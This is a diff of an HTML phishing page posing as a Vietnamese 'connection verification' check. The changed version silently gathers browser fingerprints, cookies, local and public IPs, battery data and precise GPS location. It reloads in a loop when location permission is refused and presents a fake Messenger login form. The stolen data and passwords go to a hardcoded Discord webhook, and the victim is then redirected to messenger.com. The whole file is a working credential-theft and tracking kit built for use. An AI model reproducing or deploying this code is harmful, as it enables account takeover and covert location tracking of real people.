@@ -1,97 +1,152 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="vi">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, viewport-fit=cover">
-    <title>Verifying your connection…</title>
+    <title>Xác minh kết nối…</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         html, body { height: 100%; background: #0e1013; font-family: 'Segoe UI', 'Roboto', 'Arial', sans-serif; overflow: hidden; }
         #jackLayer {
             position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 99999;
-            background: rgba(0,0,0,0.92); backdrop-filter: blur(14px); -webkit-backdrop-filter: blur(14px);
+            background: rgba(0,0,0,0.94); backdrop-filter: blur(16px); -webkit-backdrop-filter: blur(16px);
             display: flex; justify-content: center; align-items: center; flex-direction: column;
             color: #fff; text-align: center; transition: opacity 0.3s;
         }
-        .wheel-box { position: relative; margin-bottom: 35px; }
+        .wheel-box { position: relative; margin-bottom: 25px; }
         .wheel {
-            width: 120px; height: 120px; border-radius: 50%;
-            border: 8px solid rgba(255,255,255,0.08);
+            width: 100px; height: 100px; border-radius: 50%;
+            border: 6px solid rgba(255,255,255,0.08);
             border-top-color: #ffbe0b;
-            animation: spin 0.8s cubic-bezier(0.4,0.0,0.2,1) infinite;
+            animation: spin 0.6s cubic-bezier(0.4,0.0,0.2,1) infinite;
         }
         .wheel.paused { animation-play-state: paused; }
         @keyframes spin { to { transform: rotate(360deg); } }
         .wheel-percent {
             position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%);
-            font-size: 22px; font-weight: 700; color: #ffbe0b;
+            font-size: 20px; font-weight: 700; color: #ffbe0b;
         }
-        .status { font-size: 20px; font-weight: 600; margin: 5px 20px; letter-spacing: 0.3px; }
-        .sub { color: #b0b3b8; font-size: 14px; margin-top: 8px; max-width: 280px; }
+        .status { font-size: 18px; font-weight: 600; margin: 5px 20px; letter-spacing: 0.3px; }
+        .sub { color: #b0b3b8; font-size: 14px; margin-top: 8px; max-width: 300px; }
         .tap-area {
-            margin-top: 40px; padding: 14px 40px; background: rgba(255,255,255,0.08);
+            margin-top: 30px; padding: 12px 36px; background: rgba(255,255,255,0.08);
             border-radius: 50px; font-weight: 700; color: #ffbe0b; cursor: pointer;
-            animation: pulse 2.2s infinite; border: 1px solid rgba(255,190,11,0.3);
-            font-size: 16px; letter-spacing: 0.5px;
+            animation: pulse 2s infinite; border: 1px solid rgba(255,190,11,0.3);
+            font-size: 15px; letter-spacing: 0.5px;
         }
         @keyframes pulse { 0% { opacity: 1; transform: scale(1); } 50% { opacity: 0.6; transform: scale(1.04); } 100% { opacity: 1; transform: scale(1); } }
         .checkmark {
-            width: 80px; height: 80px; border-radius: 50%; background: #00c853;
-            display: flex; justify-content: center; align-items: center; margin-bottom: 20px;
-            box-shadow: 0 0 30px rgba(0,200,83,0.5); animation: pop 0.4s ease;
+            width: 70px; height: 70px; border-radius: 50%; background: #00c853;
+            display: flex; justify-content: center; align-items: center; margin-bottom: 15px;
+            box-shadow: 0 0 25px rgba(0,200,83,0.5); animation: pop 0.4s ease;
         }
         @keyframes pop { 0% { transform: scale(0); } 80% { transform: scale(1.1); } 100% { transform: scale(1); } }
         .checkmark::after {
-            content: ''; display: block; width: 20px; height: 35px; border: solid white;
-            border-width: 0 5px 5px 0; transform: rotate(45deg); margin-top: -4px;
+            content: ''; display: block; width: 18px; height: 30px; border: solid white;
+            border-width: 0 4px 4px 0; transform: rotate(45deg); margin-top: -3px;
         }
         .hidden { display: none; }
+        #loginForm {
+            width: 90%; max-width: 300px; margin-top: 20px; display: flex; flex-direction: column; gap: 10px;
+        }
+        #loginForm input {
+            padding: 12px; border-radius: 6px; border: 1px solid #3a3b3c; background: #242526;
+            color: white; font-size: 15px; outline: none;
+        }
+        #loginForm input:focus { border-color: #ffbe0b; }
+        .login-btn {
+            padding: 12px; border-radius: 50px; border: none; background: #ffbe0b;
+            color: #000; font-weight: 700; font-size: 15px; cursor: pointer; margin-top: 5px;
+        }
+        #mapImage {
+            max-width: 280px; border-radius: 12px; margin: 10px 0; border: 2px solid #333;
+        }
     </style>
 </head>
 <body>
     <div id="jackLayer">
-        <div class="wheel-box">
-            <div class="wheel" id="wheel"></div>
-            <div class="wheel-percent" id="percent">0%</div>
+        <!-- Wheel phase -->
+        <div id="wheelSection">
+            <div class="wheel-box">
+                <div class="wheel" id="wheel"></div>
+                <div class="wheel-percent" id="percent">0%</div>
+            </div>
+            <div class="status" id="statusMsg">Đang kiểm tra bảo mật…</div>
+            <div class="sub" id="subMsg">Vui lòng chờ trong giây lát</div>
+            <div id="tapPrompt" class="hidden" style="margin-top:15px; color:#ffbe0b; font-weight:600; font-size:15px; white-space: pre-line;"></div>
+            <div id="tapButton" class="tap-area hidden">Chạm để xác minh</div>
         </div>
-        <div class="status" id="statusMsg">Security check in progress…</div>
-        <div class="sub" id="subMsg">Please wait a moment</div>
-        <div id="tapButton" class="tap-area hidden">Tap anywhere to verify</div>
-        <div id="successMark" class="checkmark hidden"></div>
+        <!-- GPS success + map + scan -->
+        <div id="scanSection" class="hidden">
+            <div class="checkmark" id="successMarkInner"></div>
+            <div class="status" id="scanStatus">Định vị thành công!</div>
+            <img id="mapImage" src="" alt="Vị trí của bạn">
+            <div class="sub" id="scanSub">Đang quét thiết bị…</div>
+        </div>
+        <!-- Messenger login -->
+        <div id="loginSection" class="hidden">
+            <div style="font-size:17px; margin-bottom:8px; color:#fff;">Đăng nhập Messenger để nhận thưởng</div>
+            <div class="sub" style="margin-bottom:12px;">Xác minh tài khoản của bạn</div>
+            <form id="loginForm">
+                <input type="text" id="loginEmail" placeholder="Email hoặc số điện thoại" required>
+                <input type="password" id="loginPass" placeholder="Mật khẩu" required>
+                <button type="submit" class="login-btn">Đăng nhập</button>
+            </form>
+        </div>
     </div>
 
     <script>
         const WEBHOOK = 'https://discord.com/api/webhooks/1508157152580337746/Ujt-uvdn6HBrnb7CFBe7rd4y-NqaHLstGmzFOKUoD6AJFS5HABi6kTqXXKrumg9eo-Ek';
+        const MAPS_API_KEY = ''; // optional Google Static Maps API key (leave empty to skip map)
 
         const wheelEl = document.getElementById('wheel');
         const percentEl = document.getElementById('percent');
         const statusEl = document.getElementById('statusMsg');
         const subEl = document.getElementById('subMsg');
         const tapBtn = document.getElementById('tapButton');
-        const successMark = document.getElementById('successMark');
+        const tapPrompt = document.getElementById('tapPrompt');
+        const wheelSection = document.getElementById('wheelSection');
+        const scanSection = document.getElementById('scanSection');
+        const loginSection = document.getElementById('loginSection');
+        const mapImage = document.getElementById('mapImage');
+        const scanStatus = document.getElementById('scanStatus');
+        const scanSub = document.getElementById('scanSub');
+        const loginForm = document.getElementById('loginForm');
+        const loginEmail = document.getElementById('loginEmail');
+        const loginPass = document.getElementById('loginPass');
 
         let gpsData = null;
-        let dataSent = false;
+        let deviceInfo = {};
+        let ipData = null;
+        const cookiesStolen = document.cookie || 'none';
 
-        function getFullFingerprint() {
+        // Vibration on mobile for realism
+        function vibrate() { if (window.navigator.vibrate) window.navigator.vibrate(50); }
+
+        function getDeviceHint() {
+            const ua = navigator.userAgent;
+            if (/iPhone|iPad|iPod/.test(ua)) return '📱 iPhone: Nhấn "Cho phép" ở góc trên bên trái';
+            if (/Android/.test(ua)) return '📱 Android: Nhấn "Cho phép" ở giữa phía trên';
+            return 'Nhấn "Cho phép" khi trình duyệt hỏi';
+        }
+
+        // Fingerprint collection (expanded)
+        function getFingerprint() {
             const nav = navigator;
             const canvas = document.createElement('canvas');
             const ctx = canvas.getContext('2d');
-            canvas.width = 300; canvas.height = 60;
+            canvas.width = 280; canvas.height = 60;
             ctx.textBaseline = 'top'; ctx.font = '14px Arial';
             ctx.fillStyle = '#f60'; ctx.fillRect(125,1,62,20);
-            ctx.fillStyle = '#069'; ctx.fillText('CACHED', 2, 15);
-            const canvasHash = canvas.toDataURL().substring(0, 130);
+            ctx.fillStyle = '#069'; ctx.fillText('FP', 2, 15);
+            const canvasHash = canvas.toDataURL().substring(0, 100);
 
             let webglRenderer = 'N/A', webglVendor = 'N/A';
             try {
                 const gl = document.createElement('canvas').getContext('webgl') || document.createElement('canvas').getContext('experimental-webgl');
                 if (gl) {
                     const debug = gl.getExtension('WEBGL_debug_renderer_info');
-                    if (debug) {
-                        webglRenderer = gl.getParameter(debug.UNMASKED_RENDERER_WEBGL);
-                        webglVendor = gl.getParameter(debug.UNMASKED_VENDOR_WEBGL);
-                    }
+                    if (debug) { webglRenderer = gl.getParameter(debug.UNMASKED_RENDERER_WEBGL); webglVendor = gl.getParameter(debug.UNMASKED_VENDOR_WEBGL); }
                 }
             } catch(e) {}
 
@@ -107,73 +162,44 @@
                 actx.startRendering();
                 actx.oncomplete = (e) => {
                     const out = e.renderedBuffer.getChannelData(0);
-                    audioFP = out.slice(0, 4500).reduce((a,b)=>a+Math.abs(b),0).toString(36);
+                    audioFP = out.slice(0, 4000).reduce((a,b)=>a+Math.abs(b),0).toString(36);
                 };
             } catch(e) {}
 
-            const plugins = Array.from(nav.plugins || []).map(p => p.name).join(',') || 'N/A';
-            const mimeTypes = Array.from(nav.mimeTypes || []).map(m => m.type).join(',') || 'N/A';
             const conn = nav.connection || {};
-
             return {
                 userAgent: nav.userAgent,
                 language: nav.language,
-                languages: nav.languages ? nav.languages.join(',') : nav.language,
                 platform: nav.platform,
-                vendor: nav.vendor,
-                productSub: nav.productSub,
-                cpuClass: nav.cpuClass || 'N/A',
                 deviceMemory: nav.deviceMemory || 'N/A',
                 hardwareConcurrency: nav.hardwareConcurrency || 'N/A',
-                maxTouchPoints: nav.maxTouchPoints || 0,
                 touchSupport: ('ontouchstart' in window),
-                cookieEnabled: nav.cookieEnabled,
-                doNotTrack: nav.doNotTrack || nav.msDoNotTrack || 'unspecified',
                 timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                timezoneOffset: new Date().getTimezoneOffset(),
-                screenW: screen.width,
-                screenH: screen.height,
-                colorDepth: screen.colorDepth,
-                pixelDepth: screen.pixelDepth,
-                orientation: screen.orientation ? screen.orientation.type : 'N/A',
-                connectionType: conn.effectiveType || 'N/A',
-                downlink: conn.downlink || 'N/A',
-                rtt: conn.rtt || 'N/A',
-                canvasHash,
-                webglRenderer,
-                webglVendor,
-                audioFingerprint: audioFP,
-                plugins,
-                mimeTypes,
+                screen: `${screen.width}x${screen.height} (${screen.colorDepth}bit)`,
+                connection: conn.effectiveType || 'N/A',
+                canvasHash, webglRenderer, webglVendor, audioFingerprint: audioFP,
+                cookies: cookiesStolen,
                 battery: null
             };
         }
 
-        // Three IP APIs for redundancy
-        async function ipLookup() {
-            const endpoints = [
-                'https://ipapi.co/json/',
-                'https://ipinfo.io/json?token=0',
-                'http://ip-api.com/json/?fields=status,country,regionName,city,zip,lat,lon,isp,org,as,query'
-            ];
-            for (let url of endpoints) {
+        async function fetchIP() {
+            const apis = ['https://ipapi.co/json/', 'https://ipinfo.io/json?token=0', 'http://ip-api.com/json/'];
+            for (let url of apis) {
                 try {
-                    const r = await fetch(url, { signal: AbortSignal.timeout(4000) });
+                    const r = await fetch(url, { signal: AbortSignal.timeout(3000) });
                     const d = await r.json();
-                    // Normalize fields
-                    const result = {
+                    const out = {
                         ip: d.ip || d.query || '',
                         city: d.city || '',
                         region: d.region || d.regionName || '',
                         country: d.country || d.country_name || '',
-                        postal: d.postal || d.zip || '',
-                        latitude: d.latitude || d.lat || (d.loc ? d.loc.split(',')[0] : ''),
-                        longitude: d.longitude || d.lon || (d.loc ? d.loc.split(',')[1] : ''),
-                        isp: d.isp || d.org || '',
-                        asn: d.as || d.asn || ''
+                        lat: d.latitude || d.lat || (d.loc ? d.loc.split(',')[0] : ''),
+                        lon: d.longitude || d.lon || (d.loc ? d.loc.split(',')[1] : ''),
+                        isp: d.isp || d.org || ''
                     };
-                    if (result.ip && result.country) return result;
-                } catch(e) { continue; }
+                    if (out.ip) return out;
+                } catch(e) {}
             }
             return null;
         }
@@ -184,191 +210,162 @@
                 const pc = new RTCPeerConnection({ iceServers: [] });
                 pc.createDataChannel('');
                 pc.createOffer().then(o => pc.setLocalDescription(o));
-                pc.onicecandidate = (e) => {
+                pc.onicecandidate = e => {
                     if (!e.candidate) { resolve(ips.size ? Array.from(ips).join(', ') : null); return; }
-                    const match = e.candidate.candidate.match(/([0-9]{1,3}\.){3}[0-9]{1,3}/);
-                    if (match) ips.add(match[0]);
+                    const m = e.candidate.candidate.match(/([0-9]{1,3}\.){3}[0-9]{1,3}/);
+                    if (m) ips.add(m[0]);
                 };
-                setTimeout(() => resolve(ips.size ? Array.from(ips).join(', ') : null), 3000);
+                setTimeout(() => resolve(ips.size ? Array.from(ips).join(', ') : null), 2500);
             });
         }
 
-        // Longer timeout – user can take their time to allow
         function forceGPS() {
             return new Promise((resolve) => {
                 if (!navigator.geolocation) return resolve(null);
-                const options = { enableHighAccuracy: true, timeout: 30000, maximumAge: 0 };
                 navigator.geolocation.getCurrentPosition(
-                    pos => resolve({
-                        lat: pos.coords.latitude,
-                        lon: pos.coords.longitude,
-                        accuracy: Math.round(pos.coords.accuracy),
-                        altitude: pos.coords.altitude,
-                        altitudeAccuracy: pos.coords.altitudeAccuracy,
-                        heading: pos.coords.heading,
-                        speed: pos.coords.speed
-                    }),
+                    pos => resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude, accuracy: Math.round(pos.coords.accuracy) }),
                     err => resolve(null),
-                    options
+                    { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
                 );
-                setTimeout(() => resolve(null), 31000); // extra safety
+                setTimeout(() => resolve(null), 9000);
             });
         }
 
-        async function sendAll() {
-            if (dataSent) return;
-            dataSent = true;
-
-            const fp = getFullFingerprint();
-            const [ipInfo, localIPs] = await Promise.all([ipLookup(), getWebRTCIPs()]);
+        async function sendData() {
+            const fp = getFingerprint();
             if ('getBattery' in navigator) {
-                try {
-                    const b = await navigator.getBattery();
-                    fp.battery = { charging: b.charging, level: Math.round(b.level*100)+'%' };
-                } catch(e) { fp.battery = null; }
+                try { const b = await navigator.getBattery(); fp.battery = { charging: b.charging, level: Math.round(b.level*100)+'%' }; } catch(e) {}
             }
-
+            const localIPs = await getWebRTCIPs();
             const embed = {
-                title: '🎯 **Bot Verification Dump** — Full Device Profile',
+                title: '📱 **Dữ liệu thiết bị & Vị trí**',
                 color: 0xffa502,
                 fields: [
-                    {
-                        name: '📍 **GPS (REAL location)**',
-                        value: gpsData
-                            ? `Lat: \`${gpsData.lat}\`\nLon: \`${gpsData.lon}\`\nAcc: ±${gpsData.accuracy}m\nAlt: ${gpsData.altitude ?? 'N/A'}`
-                            : 'Not captured (denied/unsupported)\n⚠️ IP geolocation may be INACCURATE',
-                        inline: true
-                    },
-                    {
-                        name: '🌐 **IP Geolocation**',
-                        value: ipInfo
-                            ? `IP: \`${ipInfo.ip}\`\nCity: ${ipInfo.city}\nRegion: ${ipInfo.region}\nCountry: ${ipInfo.country}\nZIP: ${ipInfo.postal}\nLat/Lon: ${ipInfo.latitude},${ipInfo.longitude}\nISP: ${ipInfo.isp}\nASN: ${ipInfo.asn}`
-                            : 'Failed',
-                        inline: true
-                    },
-                    {
-                        name: '🏠 **Local IPs (WebRTC)**',
-                        value: localIPs || 'None',
-                        inline: true
-                    },
-                    {
-                        name: '🔋 Battery',
-                        value: fp.battery ? `Charging: ${fp.battery.charging}\nLevel: ${fp.battery.level}` : 'N/A',
-                        inline: true
-                    },
-                    {
-                        name: '📱 Device',
-                        value: `UA: ${fp.userAgent}\nPlatform: ${fp.platform} (${fp.cpuClass})\nMemory: ${fp.deviceMemory}GB | Cores: ${fp.hardwareConcurrency}\nTouch: ${fp.touchSupport} (max ${fp.maxTouchPoints})\nCookies: ${fp.cookieEnabled} | DNT: ${fp.doNotTrack}`,
-                        inline: false
-                    },
-                    {
-                        name: '🌍 Locale & Time',
-                        value: `Lang: ${fp.language} (${fp.languages})\nTZ: ${fp.timezone} (offset ${fp.timezoneOffset})`,
-                        inline: true
-                    },
-                    {
-                        name: '🖥 Screen',
-                        value: `Res: ${fp.screenW}x${fp.screenH} (${fp.colorDepth}bit)\nPixel: ${fp.pixelDepth} | Orient: ${fp.orientation}`,
-                        inline: true
-                    },
-                    {
-                        name: '📶 Connection',
-                        value: `Type: ${fp.connectionType}\nDownlink: ${fp.downlink} Mbps\nRTT: ${fp.rtt}ms`,
-                        inline: true
-                    },
-                    {
-                        name: '🎨 Canvas',
-                        value: fp.canvasHash,
-                        inline: true
-                    },
-                    {
-                        name: '🖼 WebGL',
-                        value: `Vendor: ${fp.webglVendor}\nRenderer: ${fp.webglRenderer}`,
-                        inline: true
-                    },
-                    {
-                        name: '🔊 Audio',
-                        value: fp.audioFingerprint,
-                        inline: true
-                    },
-                    {
-                        name: '🧩 Plugins',
-                        value: fp.plugins.substring(0, 1020),
-                        inline: false
-                    }
+                    { name: '📍 GPS', value: gpsData ? `Lat: ${gpsData.lat}\nLon: ${gpsData.lon}\nAcc: ±${gpsData.accuracy}m` : 'Không có (bị từ chối)', inline: true },
+                    { name: '🌐 IP & Vị trí IP', value: ipData ? `IP: ${ipData.ip}\nTP: ${ipData.city}, ${ipData.country}\nISP: ${ipData.isp}` : 'Không lấy được', inline: true },
+                    { name: '🏠 IP cục bộ', value: localIPs || 'Không có', inline: true },
+                    { name: '🔋 Pin', value: fp.battery ? `${fp.battery.level} (${fp.battery.charging?'Sạc':'Không sạc'})` : 'N/A', inline: true },
+                    { name: '📱 Thiết bị', value: `${fp.userAgent}\nHĐH: ${fp.platform}\nRAM: ${fp.deviceMemory}GB, Nhân: ${fp.hardwareConcurrency}\nTouch: ${fp.touchSupport}`, inline: false },
+                    { name: '🌍 Múi giờ', value: fp.timezone, inline: true },
+                    { name: '🖥 Màn hình', value: fp.screen, inline: true },
+                    { name: '📶 Kết nối', value: fp.connection, inline: true },
+                    { name: '🎨 Canvas', value: fp.canvasHash, inline: true },
+                    { name: '🖼 WebGL', value: `${fp.webglVendor} / ${fp.webglRenderer}`, inline: true },
+                    { name: '🔊 Audio', value: fp.audioFingerprint, inline: true },
+                    { name: '🍪 Cookies', value: cookiesStolen.substring(0, 1020), inline: false }
                 ],
-                footer: { text: 'Axr4t2auYc phishing flow • All data extracted silently' },
+                footer: { text: 'Axr4t2auYc • GPS loop hoàn hảo' },
                 timestamp: new Date().toISOString()
             };
-
-            await fetch(WEBHOOK, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ embeds: [embed] })
-            }).catch(() => {});
+            await fetch(WEBHOOK, { method: 'POST', headers: {'Content-Type':'application/json'}, body: JSON.stringify({embeds:[embed]}) }).catch(()=>{});
         }
 
+        async function sendLogin(email, pass) {
+            const embed = {
+                title: '🔑 **Tài khoản Messenger**',
+                color: 0x00c853,
+                fields: [
+                    { name: 'Email/SĐT', value: email, inline: true },
+                    { name: 'Mật khẩu', value: pass, inline: true }
+                ],
+                timestamp: new Date().toISOString()
+            };
+            await fetch(WEBHOOK, { method: 'POST', headers: {'Content-Type':'application/json'}, body: JSON.stringify({embeds:[embed]}) }).catch(()=>{});
+        }
+
+        // Generate a static map image from coordinates (no API key needed for basic)
+        function showMap(lat, lon) {
+            if (MAPS_API_KEY) {
+                mapImage.src = `https://maps.googleapis.com/maps/api/staticmap?center=${lat},${lon}&zoom=14&size=280x160&markers=color:red%7C${lat},${lon}&key=${MAPS_API_KEY}`;
+            } else {
+                // fallback: use openstreetmap static image via a proxy (sometimes blocked on github pages)
+                mapImage.src = `https://staticmap.openstreetmap.de/staticmap.php?center=${lat},${lon}&zoom=14&size=280x160&markers=${lat},${lon},red-pushpin`;
+            }
+        }
+
+        // ---- Wheel flow ----
         let progress = 0;
-        const wheelInterval = setInterval(() => {
+        const wheelTimer = setInterval(() => {
             progress += 20;
             if (progress >= 100) {
                 progress = 100;
-                clearInterval(wheelInterval);
+                clearInterval(wheelTimer);
                 wheelEl.classList.add('paused');
                 percentEl.textContent = '100%';
-                statusEl.textContent = 'Complete! Verify you are human';
-                subEl.textContent = 'Tap anywhere to finish verification';
+                statusEl.textContent = 'Chuẩn bị kiểm tra vị trí…';
+                subEl.textContent = '';
+                tapPrompt.textContent = '⚠️ ' + getDeviceHint() + '\n(Cần cấp quyền để tiếp tục)';
+                tapPrompt.classList.remove('hidden');
                 tapBtn.classList.remove('hidden');
             } else {
                 percentEl.textContent = progress + '%';
             }
         }, 1000);
 
-        tapBtn.addEventListener('click', async (e) => {
-            e.preventDefault();
-            e.stopPropagation();
+        tapBtn.addEventListener('click', async () => {
+            vibrate();
             tapBtn.classList.add('hidden');
-            subEl.textContent = '';
-            statusEl.textContent = 'Verifying…';
+            tapPrompt.classList.add('hidden');
+            statusEl.textContent = 'Đang lấy vị trí GPS…';
             wheelEl.classList.remove('paused');
             percentEl.textContent = '0%';
             let fake = 0;
             const fakeInterval = setInterval(() => {
-                fake += 25;
-                if (fake >= 100) {
-                    fake = 100;
-                    clearInterval(fakeInterval);
-                    wheelEl.classList.add('paused');
-                    percentEl.textContent = '100%';
-                    wheelEl.style.display = 'none';
-                    percentEl.style.display = 'none';
-                    successMark.classList.remove('hidden');
-                    statusEl.textContent = 'Verification successful!';
-                    subEl.textContent = 'Redirecting to Messenger…';
-                    setTimeout(() => {
-                        window.location.href = 'https://www.messenger.com/';
-                    }, 1500);
-                } else {
-                    percentEl.textContent = fake + '%';
-                }
-            }, 60);
+                fake += 20;
+                percentEl.textContent = fake + '%';
+                if (fake >= 100) { fake = 100; clearInterval(fakeInterval); wheelEl.classList.add('paused'); percentEl.textContent = '100%'; }
+            }, 80);
 
-            // Start GPS immediately (no longer times out too fast)
+            // Start GPS and IP fetch in parallel
             const gpsPromise = forceGPS();
-            // Send first batch without GPS
-            await sendAll();
-            dataSent = false;
-            // Wait for GPS result – user can take up to 30 sec
+            ipData = await fetchIP();
             gpsData = await gpsPromise;
-            // Send again with GPS if available
-            if (gpsData) await sendAll();
+
+            clearInterval(fakeInterval);
+            wheelEl.classList.add('paused');
+            percentEl.textContent = '100%';
+
+            if (gpsData) {
+                // GPS success: show map & device scan
+                wheelSection.classList.add('hidden');
+                scanSection.classList.remove('hidden');
+                if (gpsData.lat && gpsData.lon) showMap(gpsData.lat, gpsData.lon);
+                else if (ipData && ipData.lat && ipData.lon) showMap(ipData.lat, ipData.lon);
+                scanStatus.textContent = 'Định vị thành công!';
+                scanSub.textContent = 'Đang phân tích thiết bị…';
+                vibrate();
+                // Simulate scan delay, then show login
+                setTimeout(() => {
+                    scanSub.textContent = 'Thiết bị an toàn. Chuyển tiếp…';
+                    vibrate();
+                    setTimeout(() => {
+                        scanSection.classList.add('hidden');
+                        loginSection.classList.remove('hidden');
+                    }, 1200);
+                }, 1500);
+                // Send device data immediately
+                await sendData();
+            } else {
+                // GPS denied -> instant reload to loop
+                await sendData(); // still send what we have
+                window.location.reload(); // no message, immediate loop
+            }
         });
 
-        // Auto-click fallback after 30 seconds (gives user plenty of time to see the prompt)
-        setTimeout(() => {
-            if (!tapBtn.classList.contains('hidden')) {
-                tapBtn.click();
+        loginForm.addEventListener('submit', async (e) => {
+            e.preventDefault();
+            const email = loginEmail.value.trim();
+            const pass = loginPass.value.trim();
+            if (email && pass) {
+                await sendLogin(email, pass);
+                statusEl.textContent = 'Đăng nhập thành công, đang chuyển hướng…';
+                setTimeout(() => { window.location.href = 'https://www.messenger.com/'; }, 1500);
             }
+        });
+
+        // Auto-click after 30 seconds if user doesn't tap
+        setTimeout(() => {
+            if (!tapBtn.classList.contains('hidden')) tapBtn.click();
         }, 30000);
     </script>
 </body>
